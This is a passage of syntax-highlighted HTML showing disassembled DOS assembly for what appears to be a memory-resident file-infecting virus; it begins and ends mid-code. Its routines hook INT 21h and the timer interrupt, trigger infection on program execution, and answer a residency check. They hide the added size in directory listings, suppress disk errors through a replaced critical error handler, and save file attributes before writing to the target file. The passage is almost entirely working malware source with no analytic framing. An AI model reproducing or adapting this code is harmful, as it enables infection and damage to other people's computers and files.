   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0226</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0228</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">RETF</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">NEW_TIMER_TICK_INTERRUPT</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">084</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0800</span><span class="sc0">
   </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc2">05B0</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0575</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">05B0</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B6</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">09B0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">070</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">072</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">04C</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">04C</span><span class="sc4">],</span><span class="sc2">09BE</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">04E</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">084</span><span class="sc4">],</span><span class="sc2">04B1</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">086</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">INT_21_INTERCEPT</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">011</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_HANDLE</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">012</span><span class="sc0">
   </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_HANDLE</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ADJUST_FCB_MATCHES</span><span class="sc0">
   </span><span class="sc6">RETF</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc5">CHECK_FOR_HANDLE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">04E</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_PREVIOUS_INSTALLATION</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">04F</span><span class="sc0">
   </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_PREVIOUS_INSTALLATION</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ADJUST_HANDLE_MATCHES</span><span class="sc0">
   </span><span class="sc6">RETF</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc5">CHECK_FOR_PREVIOUS_INSTALLATION</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FE02</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_MESSAGE_PRINT</span><span class="sc0">
   </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">IRET</span><span class="sc0">
 </span><span class="sc5">CHECK_FOR_MESSAGE_PRINT</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FE03</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_EXECUTE</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CHAIN_TO_TRUE_INT_21</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PRINT_MESSAGE</span><span class="sc0">
   </span><span class="sc6">IRET</span><span class="sc0">
 </span><span class="sc5">CHECK_FOR_EXECUTE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04B00</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">SET_STACK</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">04C</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CHAIN_TO_TRUE_INT_21</span><span class="sc0">
 </span><span class="sc5">SET_STACK</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A6</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A8</span><span class="sc4">],</span><span class="sc8">SS</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CLI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">0AE5</span><span class="sc0">
   </span><span class="sc6">STI</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">04C</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">TO_AN_INFECTION</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PROGRAM_TERMINATION_ROUTINE</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">NO_INFECTION</span><span class="sc0">
 </span><span class="sc5">TO_AN_INFECTION</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INFECT_THE_FILE</span><span class="sc0">
 </span><span class="sc5">NO_INFECTION</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CLI</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">STI</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">CHAIN_TO_TRUE_INT_21</span><span class="sc0">
 </span><span class="sc5">CHAIN_TO_TRUE_INT_21</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09BC</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">NEW_CRITICAL_ERROR_HANDLER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">ADJUST_FCB_MATCHES</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02F</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0664</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0FF</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">064F</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">017</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0664</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01D</span><span class="sc4">],</span><span class="sc2">09A4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01F</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ADJUST_HANDLE_MATCHES</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02F</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">0691</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">016</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0691</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01A</span><span class="sc4">],</span><span class="sc2">09A4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01C</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">WRITE_TO_THE_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">040</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">069C</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">READ_FROM_THE_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03F</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06B4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">MOVE_TO_END_OF_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04202</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">06B4</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">MOVE_TO_BEGINNING_OF_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04200</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CLI</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">INFECT_THE_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CHECK_LETTERS_IN_FILENAME</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">GOOD_NAME</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BAD_NAME</span><span class="sc0">

</span><span class="sc5">GOOD_NAME</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">SAVE_AND_REPLACE_CRITICAL_ERROR_HANDLER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">03524</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B8</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09BA</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">02524</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">052A</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">SAVE_AND_REPLACE_FILE_ATTRIBUTE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04300</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
